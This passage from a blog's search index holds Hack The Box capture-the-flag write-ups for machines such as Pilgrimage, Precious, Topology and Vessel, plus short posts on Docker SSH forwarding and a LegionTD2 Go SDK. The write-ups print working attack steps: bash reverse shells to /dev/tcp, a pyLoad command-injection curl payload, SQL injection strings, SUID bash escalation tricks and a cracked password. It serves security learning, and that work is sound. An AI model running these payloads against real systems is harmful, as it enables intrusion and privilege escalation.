I\u0026rsquo;ve used admin:admin to login, and I got a token and a data:\n{ \u0026#34;message\u0026#34;: \u0026#34;Your id is 80.\u0026#34; } // token\tb\u0026#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk\u0026#39; I\u0026rsquo;ve used the Request Metadata to send the token when calling the getInfo procedure.\nMeta: token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxODM0MDh9.Hpp12rEGhXQONEN2yi65_NCuMQNN5fnvtJbFhI_PEZk Data: id: 80 This got me:\n{ \u0026#34;message\u0026#34;: \u0026#34;Will update soon.\u0026#34; } I have no idea what is happening at this point, and I decided to run sqlmap on those requests.\nTo do that I had to capture the request that is going to the server, I can proxy the UI\u0026rsquo;s requests towards the RPC with burp. Start burp and intercept the gRPC Web UI and capture the request towards the server. Then save the request to getInfo into a file.\nUsing sqlmap -r request_file --batch we can dump the credentials for the user and login with the ssh.\nNow the root is a bit tricky, I\u0026rsquo;ve noticed some processes that are running on port 8000 using linpeas. This port is inaccessible, so I had to forward the port to my host using ssh.\n$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214 Now I can access it, and it turns out to be pyLoad, searching around I saw this:\nhttps://github.com/advisories/GHSA-pf38-5p22-x6h6 https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/ Where I can see the following payload\ncurl -i -s -k -X $\u0026#39;POST\u0026#39; \\ -H $\u0026#39;Host: 127.0.0.1:8000\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Content-Length: 184\u0026#39; \\ --data-binary $\u0026#39;package=xxx\u0026amp;crypted=AAAA\u0026amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};\u0026amp;passwords=aaaa\u0026#39; \\ $\u0026#39;http://127.0.0.1:8000/flash/addcrypted2\u0026#39; Decoding the payload on the jk param: pyimport os;os.system(\u0026quot;touch /tmp/pwnd\u0026quot;);f=function f2(){};\nNow we just have to encode chmod +s /bin/bash into os.system(). After executing that payload, we can launch bash in privilege mode bash -p and I got root.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-05-26-htb-pc\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-06-25-htb-pilgrimage\/": {
        "title": "Hack The Box - Pilgrimage [Easy]",
        "tags": [],
        "content": "I started off with rustscan\n$ rustscan -a Open 10.10.11.219:22 Open 10.10.11.219:80 Then I ran ffuf to brute force some directories.\n$ ffuf -u http://10.10.11.219/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/common.txt That yielded the .git folders, I used git-dumper to dump the whole repository. Upon investigating the source code of the application, I\u0026rsquo;ve noticed a user called emily. I also discovered an executable magick and this fragmet of code:\n$newname = uniqid(); exec(\u0026#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/\u0026#34; . $upload-\u0026gt;getName() . $mime . \u0026#34; -resize 50% /var/www/pilgrimage.htb/shrunk/\u0026#34; . $newname . $mime); unlink($upload-\u0026gt;getFullPath()); The program seems to be invoking this binary to shrink the image that is being uploaded through the website, the program itself is ImageMagick 7.1.0-49 beta we discover that by invoking it with -version.\n$ ./magick -version Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org Copyright: (C) 1999 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib Compiler: gcc (7.5) This version is vulnerable to Arbitrary Remote Leak, https://www.metabaseq.com/imagemagick-zero-days/ .\nFurthermore, we notice some files of interest in the source code as well, such as the database file.\n$db = new PDO(\u0026#39;sqlite:/var/db/pilgrimage\u0026#39;); Exploiting I\u0026rsquo;ve used this PoC to generate my payload: https://github.com/Sybil-Scan/imagemagick-lfi-poc I\u0026rsquo;ve crafted my malicious image to read the database file /var/db/pilgrimage and shrink it through the website, I\u0026rsquo;ve then downloaded the file and converted the bytes, opened it and after some digging I found the password for user emiliy. Then you can login with ssh.\nGetting root I\u0026rsquo;ve used linpeas.sh to enumerate the system, and I\u0026rsquo;ve noticed a process running:\nroot 726 0.0 0.0 6816 3072 ? Ss 15:00 0:00 /bin/bash /usr/sbin/malwarescan.sh I checked the permissions of the script:\nemily@pilgrimage:~$ ls -la /usr/sbin/malwarescan.sh -rwxr--r-- 1 root root 474 Jun 1 19:14 /usr/sbin/malwarescan.sh And then I saw the script itself:\nemily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh #!/bin/bash blacklist=(\u0026#34;Executable script\u0026#34; \u0026#34;Microsoft executable\u0026#34;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=\u0026#34;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \u0026#34;$FILE\u0026#34; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e \u0026#39;s/^.*CREATE //p\u0026#39;)\u0026#34; binout=\u0026#34;$(/usr/local/bin/binwalk -e \u0026#34;$filename\u0026#34;)\u0026#34; for banned in \u0026#34;${blacklist[@]}\u0026#34;; do if [[ \u0026#34;$binout\u0026#34; == *\u0026#34;$banned\u0026#34;* ]]; then /usr/bin/rm \u0026#34;$filename\u0026#34; break fi done done This script seems to be invoking binwalk, I searched for some exploits and I found this one: https://www.exploit-db.com/exploits/51249 following the steps in the exploit, I\u0026rsquo;ve set up a listener and placed the malicious png crafted by the exploit in the /var/www/pilgrimage.htb/shrunk/ directory.\nemily@pilgrimage:/tmp/syl$ cp ./binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/ After a couple of seconds, my listener got a connection, which was with root privileges.\nConclusions I wanted to investigate a little further how the magick binary includes the file that it converts and this article explains it perfectly.\nhttps://www.metabaseq.com/imagemagick-zero-days/ The exploit targets the tEXt chunk of the PNG file, and this chunk is being used for storing key-value metadata for the PNG file. The problem comes whenever you use the \u0026ldquo;profile\u0026rdquo; string into that metadata, if that is being used as \u0026ldquo;key\u0026rdquo; the \u0026ldquo;value\u0026rdquo; is being interpreted as a filename, that then the functions FileToStringInfo → FileToBlob will fetch from the system, and it will populate the \u0026ldquo;value\u0026rdquo; with the file\u0026rsquo;s contents.\nAnd to add some speculation on top of it, this almost feels like a backdoor ;).\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-06-25-htb-pilgrimage\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-05-23-htb-precious\/": {
        "title": "Hack The Box - Precious [Easy]",
        "tags": [],
        "content": "We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.\nThen the website provided me with a PDF of the website that I\u0026rsquo;ve hosted, I\u0026rsquo;ve downloaded the PDF and used the exiftool to figure out what was generating this PDF file, from there I saw that it was generated by pdfkit v0.8.6.\nI went to google to check if there are any exploits and I found this:\nhttps://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 This apparently gives me a command injection exploit, and I tried the following payload:\nhttp://myip:8080/?name=#{\u0026#39;%20`bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/myip/myport 0\u0026gt;\u0026amp;1\u0026#34;`\u0026#39;} Flag 1 This gave me a reverse shell for the user ruby, from this point I\u0026rsquo;ve run linpeas.sh to check how can I gain access to the user henry and I saw the file /home/ruby/.bundle/config and I went to check it.\n$ cat /home/ruby/.bundle/config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: \u0026#34;henry:\u0026lt;passwod\u0026gt;\u0026#34; I gained access to the user with an ssh login to the hnery user and gained the user.txt flag located in the home directory.\nFlag 2 henry@precious:~$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb This gives the clue of how to get the next flag, let\u0026rsquo;s look what this file contains:\n# Compare installed dependencies with those specified in \u0026#34;dependencies.yml\u0026#34; require \u0026#34;yaml\u0026#34; require \u0026#39;rubygems\u0026#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(\u0026#34;dependencies.yml\u0026#34;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \u0026#34;Installed version differs from the one specified in file: \u0026#34; + local_name else puts \u0026#34;Installed version is equals to the one specified in file: \u0026#34; + local_name end end end end We have YAML.load(File.read(\u0026quot;dependencies.yml\u0026quot;)) which hints that we need to use the dependancies.yml file to gain root.\nUsing google again to see how can we do that, this took me some time, but figuring out the attack surface is what is this all about. The attack surface is being the YAML loader, so I\u0026rsquo;ve tried to look for exploits there, and I found this:\nhttps://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/ I executed the /usr/bin/ruby /opt/update_dependencies.rb command with sudo and then using the bash -p I gained the root access.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-05-23-htb-precious\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-06-24-htb-sandworm\/": {
        "title": "Hack The Box - Sandworm [Medium]",
        "tags": [],
        "content": "I began with a simple scan, to check the ports of the machine.\n$ rustscan -a Open 10.10.11.218:22 Open 10.10.11.218:80 Open 10.10.11.218:443 I went to the website that is being hosted on port 80, and I saw that there is some sort of PGP stuff. Furthermore, I noticed the following URLs:\nhttps://ssa.htb/login https://ssa.htb/ https://ssa.htb/pgp # the site\u0026#39;s public key https://ssa.htb/guide # some sort of playground for PGP https://ssa.htb/contact https://ssa.htb/guide/verify https://ssa.htb/about https://ssa.htb/login?next=%2Fadmin https://ssa.htb/guide/encrypt In the /guide endpoint there is some sort of playground for PGP, and while I was playing with it, I have noticed that when I am using the verify signature there is output that looked like pulled from the console.\nI\u0026rsquo;ve enumerated the technologies and versions that the website is using, I found that it used Flask as the main server application and (possibly Flask for the frontend/templating engine).\nRCE When I saw Flask I thought that the application could be using Jinja, so I immediately thought that this could be a potential SSTI . I had only a single entry point that could give me output which was through Verify Signature in the /guide endpoint.\nCrafting the exploit The injection point is the name of the PGP key, so I\u0026rsquo;ve generated a key called syl.\n$ gpg --gen-key The exploit is described/explained here .\nAfter that, we need to export the public key using this command:\n$ gpg -a -o public_key.key --export syl then we should craft an arbitrary message:\n$ echo \u0026#39;test\u0026#39; | gpg --clear-sign Common Issues While crafting this, I\u0026rsquo;ve experienced serious hassles such as:\nwrongfully crafting the message using different key to encrypt the message I fixed those issues when I started clean and using only 1 key, and whenever asked for anything \u0026ldquo;passphrase/name\u0026rdquo; I just typed \u0026ldquo;syl\u0026rdquo;.\nTo check the current keys that you have:\n$ gpg --list-keys Another useful website is this one: https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/ I\u0026rsquo;ve used the article to modify the name of the key, and then to export the public key again.\nUpon crafting the message, paste the message and the public key and click to verify the signature, this would get you a reverse shell to the machine.\nAtlas (firejailed) The user that we got atlas is actually is firejailed, commands such as wget/curl are not available in the environment. The pivot point is in the httpie directory in the $HOME folder. There you can find the admin.json file where the SSH credentials for the user silentobserver are.\nsilentobserver I ran linpeas.sh to check where would my next pivoting point would be, I stumbled fairly fast on these files that I could write:\n/opt/crates/logger/src /opt/crates/logger/src/lib.rs I noticed the application located in the /opt directory /opt/tipnet/ I\u0026rsquo;ve examined the source code, and it is some sort of rust application, I already got a hint to those writable directories and whenever I saw the source code:\nextern crate logger; ... logger::log(username, keywords.as_str().trim(), justification.as_str()); // Invoking it later on. I knew that I could modify the crate that could be executed by the application.\nBut what is this application? And where is it running?\nTipnet Application This application is running like that:\n/bin/sh -c cd /opt/tipnet \u0026amp;\u0026amp; bin/echo \u0026#34;e\u0026#34; | /bin/sudo -u atlas /usr/bin/cargo run --offline sleep 10 We can see the user atlas(not firejailed) is running it, so this could be our next attack vector.\nI\u0026rsquo;ve crafted a rust reverse shell: https://doc.rust-lang.org/std/process/struct.Command.html and added it into the logger/src/lib.rs file then I build the crate using cargo build.\nAfter some seconds, your listener should be getting a connection from the server, that would be the atlas user.\nAtlas user to root Fairly simple and straightforward, this is a CVE-2022-31214 vulnerability. You can use the already crafted exploits for that:\nhttps://www.openwall.com/lists/oss-security/2022/06/08/10 There are issues with that exploit, I believe it is in the wait mechanism. To make sure that it is working correctly add a breakpoint() in the beginning of the script then you can follow the execution by pressing \u0026ldquo;n\u0026rdquo;.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-06-24-htb-sandworm\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-04-21-htb-socket\/": {
        "title": "Hack The Box - Socket [Medium]",
        "tags": [],
        "content": "So let\u0026rsquo;s start with a rustscan of the machine\nOpen 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10.10.11.206 Completed Connect Scan at 14:37, 0.05s elapsed (3 total ports) Nmap scan report for qreader.htb (10.10.11.206) Host is up, received syn-ack (0.050s latency). Scanned at 2023-04-21 14:37:19 EEST for 0s PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 5789/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds I went to port 80 to check what is there, the idea of the website is to create QR Codes and extract text out of QR Codes, first I thought that maybe there is something with the QR codes but after some examination I decided to give up on that path and I went over the other things such as the Linux/Windows application.\nUpon further discovery using strings over the linux binary, I realized that this a packaged exectuable that was created with pyinstaller so I\u0026rsquo;ve tried to unpack it with uncompyle6 and then the pyc files with pycdc.\nI found out the following things from the source code of qreader:\n... VERSION = \u0026#39;0.0.2\u0026#39; ws_host = \u0026#39;ws://ws.qreader.htb:5789\u0026#39; ... def version(self): response = asyncio.run(ws_connect(ws_host + \u0026#39;/version\u0026#39;, json.dumps({ \u0026#39;version\u0026#39;: VERSION }))) data = json.loads(response) if \u0026#39;error\u0026#39; not in data.keys(): version_info = data[\u0026#39;message\u0026#39;] msg = f\u0026#39;\u0026#39;\u0026#39;[INFO] You have version {version_info[\u0026#39;version\u0026#39;]} which was released on {version_info[\u0026#39;released_date\u0026#39;]}\u0026#39;\u0026#39;\u0026#39; self.statusBar().showMessage(msg) return None error = None[\u0026#39;error\u0026#39;] self.statusBar().showMessage(error) def update(self): response = asyncio.run(ws_connect(ws_host + \u0026#39;/update\u0026#39;, json.dumps({ \u0026#39;version\u0026#39;: VERSION }))) data = json.loads(response) if \u0026#39;error\u0026#39; not in data.keys(): msg = \u0026#39;[INFO] \u0026#39; + data[\u0026#39;message\u0026#39;] self.statusBar().showMessage(msg) return None error = None[\u0026#39;error\u0026#39;] self.statusBar().showMessage(error) This source code tries to connect to a websocket to get its version/update, so the paths for the websockets are:\nws://ws.qreader.htb:5789/update ws://ws.qreader.htb:5789/version I\u0026rsquo;ve tested both of these with claws tool. Then I crafted a python script to connect with the socket.\nWARNING: Be really careful which quotes you are using, ' or \u0026quot; because that could interfere with the SQLi that I found in the version path!\nfrom websockets.sync.client import connect import json with connect(\u0026#34;ws://ws.qreader.htb:5789/version\u0026#34;) as websocket: websocket.send(json.dumps({\u0026#39;version\u0026#39;: \u0026#39;0.0.3\u0026#34; UNION SELECT group_concat(answer),2,3,4 from answers-- -\u0026#39;})) m = websocket.recv() print(m) With this script, I\u0026rsquo;ve enumerated the tables, columns and the username with the following payloads:\n\u0026#39;0.0.3\u0026#34; UNION SELECT group_concat(answer),2,3,4 from answers-- -\u0026#39; -\u0026gt; This finds the user Thomas Keller \u0026#39;0.0.3\u0026#34; UNION SELECT group_concat(password),2,3,4 from users-- -\u0026#39; -\u0026gt; This find the password hash Cracking the password\n$ hashcat -m 0 -a 0 0c090c365fa0559b151a43e0fea39710 ~/tools/rockyou.txt \u0026lt;PASSWORD\u0026gt; Getting the username with adusergen $ echo -n \u0026#34;Thomas Keller\u0026#34; | adusergen Thomas.Keller ThomasKeller KellerThomas Keller.Thomas Tkeller T.keller Thomas-Keller T.keller thomas.keller thomaskeller kellerthomas keller.thomas tkeller \u0026lt;--- Right One t.keller thomas-keller t.keller Root The root was fairly easy, you just have to read the documentation for spec files for pyinstaller, after that I crafted the following spec file:\nblock_cipher = __import__(\u0026#39;os\u0026#39;).system(\u0026#39;chmod +s /bin/bash\u0026#39;) tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build priv.spec 105 INFO: PyInstaller: 5.6.2 105 INFO: Python: 3.10.6 107 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35 110 INFO: UPX is not available. script \u0026#39;/home/tkeller/minimal.py\u0026#39; not found tkeller@socket:~$ /bin/bash -p bash-5.1# whoami root bash-5.1# cat /root/root.txt \u0026lt;HASH\u0026gt; ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-04-21-htb-socket\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-02-09-htb-stocker\/": {
        "title": "Hack The Box - Stocker [Easy]",
        "tags": [],
        "content": " Short Overview This box consist of several vulnerabilities:\nNoSQL Injection - Specifically the part with sending the payload using JSON, we use this vulnerability to bypass the login process. Server Side Template Injection - We could directly use HTML and then inject an iframe which src is set to /etc/passwd and after that we traverse the application itself to find the MongoDB user/password, and we used those to connect successfully to the machine using the password provided there. With that, we owned the User. Linux Privilege Escalation - Then we use sudo -l to check what commands are we allowed to execute with root privileges. And we exploited the node executable, which runs with root privileges, to own the System. ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-02-09-htb-stocker\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-06-30-htb-topology\/": {
        "title": "Hack The Box - Topology [Easy]",
        "tags": [],
        "content": "I\u0026rsquo;ve started with simple machine enumeration\n$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I\u0026rsquo;ve enumerated possible users:\nlklein vdaisley dabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website. There I found out some LaTeX to PNG convertor. I\u0026rsquo;ve figured out that there must be some trickery with this so I went my way to research the topic.\nI\u0026rsquo;ve found out the following:\nhttps://0day.work/hacking-with-latex/ https://salmonsec.com/cheatsheets/exploitation/latex_injection These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as /etc/passwd, /proc/self/cmdline, /proc/self/environ and so on, I\u0026rsquo;ve figured out that I must be missing something. I began to explore what other subdomains (because there is latex.topology.htb I thought there would be more) were on the webserver using ffuf.\n$ ffuf -w $commontxt -u http://topology.htb/ -H \u0026#34;Host: FUZZ.topology.htb\u0026#34; -r Which yielded the following domains:\ndev stats I\u0026rsquo;ve browsed through those and on the stats there were simple plots about the current usage of the system and that\u0026rsquo;s it. But on the dev subdomain there was a Basic Auth in place which I then figured out that I can read the .htpasswd with the LFI vulnerability in the latex.topology.htb input form.\nI\u0026rsquo;ve tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what\u0026rsquo;s going on.\nI honestly didn\u0026rsquo;t know how can I read the file and I turned out to some help, which I then understood that I can use the LaTeX/Source Code Listings which also can read a file with \\lstinputlisting{/var/www/dev/.htpasswd}, however the website just resulted in no image (possible error) using just this command.\nHere comes this post to the rescue https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and Since the website is about math, we can use the inline math delimiters that are $ and $ which can turn my payload from \\lstinputlisting{/var/www/dev/.htpasswd} to $\\lstinputlisting{/var/www/dev/.htpasswd}$ which resulted into getting the basic auth hash.\n$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0 Using hashcat we can extract the password\n$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn With that, I tried the users that I\u0026rsquo;ve enumerated earlier and the user vdaisley worked out, so I went to log in with SSH and got the user flag.\nRoot The root was pretty easy, first we can see which directories are writable:\n$ find / -type d -writable 2\u0026gt;/dev/null ... /opt/gnuplot ... This directory looked suspicious, I\u0026rsquo;ve fired up pspy to checkout what is going on and I got this:\nSo we are finding *.plt files in this directory, and then we are executing gnuplot as root. Using this article, I\u0026rsquo;ve crafted a test.plt file with the contents of:\nvdaisley@topology:/opt/gnuplot$ cat ~/test.plt system \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.xx/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; I\u0026rsquo;ve copied the file to the /opt/gnuplot directory and I\u0026rsquo;ve waited to get a remote connection which I got in about a minute. With that I rooted the machine.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-06-30-htb-topology\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-02-12-htb-vessel\/": {
        "title": "Hack The Box - Vessel [Hard]",
        "tags": [],
        "content": "Overview Since it becomes very time consuming doing this in a video this write-up is going to be in a text.\nThe machine is labeled hard with a good reason, most of the tasks are time consuming but there are some interesting vulnerabilities like CVE-2022-0811 and CVE-2022-24637 .\nOn top of these we have NoSQL Injection and some PE reverse engineering.\nWrite-up Flag 1 First I began enumerating the whole website with ffuf.\n$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u \u0026#34;http://vessel.htb/FUZZ\u0026#34; -fs 26 With that I discovered a folder called dev which then led me to dumping the git repository of the website:\n$ git-dumper http://vessel.htb/dev/.git ./website_dump With the website avaliable, I can check the actual source code for vulnerabilities, immediately after opening the routes/index.js I have noticed that this code might be vulnerable to NoSQL Injection.\n... let username = req.body.username; let password = req.body.password; if (username \u0026amp;\u0026amp; password) { connection.query(\u0026#39;SELECT * FROM accounts WHERE username = ? AND password = ?\u0026#39;, [username, password], function(error, results, fields) { ... The code doesn\u0026rsquo;t check if the passed values if they are objects, I can use a crafted NoSQL payload to successfully login with the admin user using this payload while doing the POST request:\nusername=admin\u0026amp;password[password]=1 Upon another discovery in the admin panel, I found that there is another domain on the host called openwebanalytics. From further investigation over what can be exploted there I have landed on CVE-2022-24637 . With that exploit I could run a successful reverse shell on the machine.\nUsing linpeas I found some useful information over the user steven\n/home/steven/passwordGenerator # Windows PE Exectuable /home/steven/.notes/screenshot.png # Screenshot of some program /home/steven/.notes/notes.pdf # Password protected PDF I suspected that the screenshot.png is am image of the passwordGenerator.On the other hand the passwordGenerator was unusually big and the whole use of that binary is to create \u0026lsquo;secure\u0026rsquo; passwords. I noticed the python icon on the binary and I suspected that this could be a packed python project with PyInstaller. I confirmed that when I loaded the whole thing in Ghidra/IDA.\nI have used pyinstxtractor to extract the *.pyc files, and then the uncomplyle6 to decompile the *.pyc files. Which has led me to the actual source code of the binary:\nThis is the function that generates the password:\ndef genPassword(self): length = value char = index if char == 0: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^\u0026amp;*()_-+={}[]|:;\u0026lt;\u0026gt;,.?\u0026#39; else: if char == 1: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#39; else: if char == 2: charset = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890\u0026#39; else: try: qsrand(QTime.currentTime().msec()) password = \u0026#39;\u0026#39; for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle(\u0026#39;Error\u0026#39;) msg.setText(\u0026#39;Error while generating password!, Send a message to the Author!\u0026#39;) x = msg.exec_() return password I edited the length to 32 (as I have it on the screenshot) and edited the script a bit more to create a list out of possible passwords. I can do that because the QTime.currentTime().msec() function returns the numbers from 1-1000 with that range I have a big chance of guessing the generated password.\nNote: This process can be a bit frustrating since it takes time to generate the passwords. I personally spent little over an hour.\nThen I used pdfcrack to crack the password of the PDF, there I found the password for the user ethan and I successfully logged in with it and I found the first flag.\nFlag 2 I ran linpeas.sh again, and I found the following SUID binary:\n... ╔══════════╣ Readable files belonging to root and readable by me but not world readable -rwsr-x--- 1 root ethan 814936 Mar 15 2022 /usr/bin/pinns ... I searched around a bit what is this, and I landed on the CVE-2022-0811 which exploited this binary. While doing this, I noticed that I also have the runc.\n╔══════════╣ Container related tools present /usr/sbin/runc This was a very tricky one, and it needs some understanding of what\u0026rsquo;s going on to successfully execute the attack. You can check out the link I\u0026rsquo;ve provided for CVE-2022-0811 to understand more about it. On the actual POC they have used Kubernetes, on our end I had to use runc.\nThe parameters that are being passed to pinns are not being sanitized and validated, so I can use that to execute code with root access.\nI needed to create a container using the runc without using root so I\u0026rsquo;ve used the --rootless arg.\nReference: https://github.com/opencontainers/runc/#rootless-containers $ mkdir /tmp/syl $ cd /tmp/syl/ $ runc spec --rootless $ mkdir rootfs $ echo \u0026#34;chmod +s /usr/bin/bash\u0026#34; \u0026gt; syl.sh Then I should mount the root to the root of the container:\nReference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation $ runc --root /tmp/syl/ run alpine # cat /etc/machine-id c4ca4238a0b923820dcc509a6f75849b This will run the container and spawn a shell. Next I would ssh into the machine from another session to execute the pinns binary to our container.\n$ /usr/bin/pinns -d /var/run -f c4ca4238a0b923820dcc509a6f75849b -s \u0026#39;kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/syl/syl.sh #\u0026#39; --ipc --net --uts --cgroup Then I need to trigger a core dump so that the pinns would execute the script in a case of a core dump. Following the PoC in crowdstrike:\n# ulimit -c unlimited # ulimit -c unlimited # tail -f /dev/null \u0026amp; # ps .. Find the `tail -f /dev/null` PID # kill -SIGSEGV {thePID} [1]+ Segmentation fault (core dumped) tail -f /dev/null Back to the other session\n$ bash -p $ cat /root/root.txt {HASH} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-02-12-htb-vessel\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2021-05-27-installing-private-packages-in-docker-image-notes\/": {
        "title": "Installing Private Packages in Docker Image - Notes",
        "tags": [],
        "content": "Quick notes about how to forward an ssh agent and other tricks regarding the installation of python packages.\nUsing SSH Forwarding Exporting the $SSH_AUTH_SOCK environment variable in the image.\n$ docker run -rm -t -i -v $(dirname $SSH_AUTH_SOCK) -e SSH_AUTH_SOCK=$SSH_AUTH_SOCK ubuntu /bin/bash Or in the environment section of a compose file.\nenvironment: SSH_AUTH_SOCK: $SSH_AUTH_SOCK Eventual Issues with that Installing ssh in the container Adding entries to /etc/ssh/ssh_known_hosts Caveats Traces of ssh keys inside the image References https://gist.github.com/d11wtq/8699521 https://vsupalov.com/build-docker-image-clone-private-repo-ssh-key/ https://medium.com/@bmihelac/examples-for-building-docker-images-with-private-python-packages-6314440e257c ", 
        "url": "http:\/\/localhost:1313\/posts\/2021-05-27-installing-private-packages-in-docker-image-notes\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-08-23-legiontd2-sdk\/": {
        "title": "LegionTD2 Go SDK (v0.2.0)",
        "tags": [],
        "content": " Recently I\u0026rsquo;ve been fascinated with a game called LegionTD2 , this is a newly created game that I\u0026rsquo;ve been playing as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td). The game is based on predictions and timings, if you play your cards right (or in the context of the game: sends/workers/units) you will prevail over the enemy team. Read more about it here .\nLegionTD SDK I\u0026rsquo;ve doing stuff in Go in my free time (mainly code challenges) for a while now and I\u0026rsquo;ve decided that I should spend some time creating something useful for myself such as creating tools that would help me get better at the game. The game has an API which resides here , there are couple of endpoints that are useful for helpful statistics such as the player/* and games/* endpoints. I knew that I will be querying the API a lot for fetching info about players and games, so I\u0026rsquo;ve decided to create an SDK for that so I can ease my work a little bit. And after couple of weeks free time work I\u0026rsquo;ve created the LegionTD 2 SDK for Go .\nFunctionality Analyze games While my ultimate goal is to create set of analytics tools for Legion, I\u0026rsquo;ve created the most basic example of how that might happen using SQLite3 and Go.\nUnder the examples/analyze_games/ I\u0026rsquo;ve created an example that fetches about 3k games and put them into a SQLite database, after that you are able to analyze the data using SQL. I\u0026rsquo;ve created a simple query that gets the percentage of games that are being finished at waves 15, 13 and 10.\nIn my case here are the results, games finished at wave\nWave 15 Wave 13 Wave 10 20% 14% 4% Exporting the games You can derive that from the previous example but I\u0026rsquo;ve created a dedicated examples for both exporting to JSON and exporting to SQL.\nExport games to SQL Export games to JSON Fetching all of the Units Since that the game hasn\u0026rsquo;t got a dedicated route for fetching all the units I\u0026rsquo;ve created a simple example that resides in the repository under examples/get_all_units . The 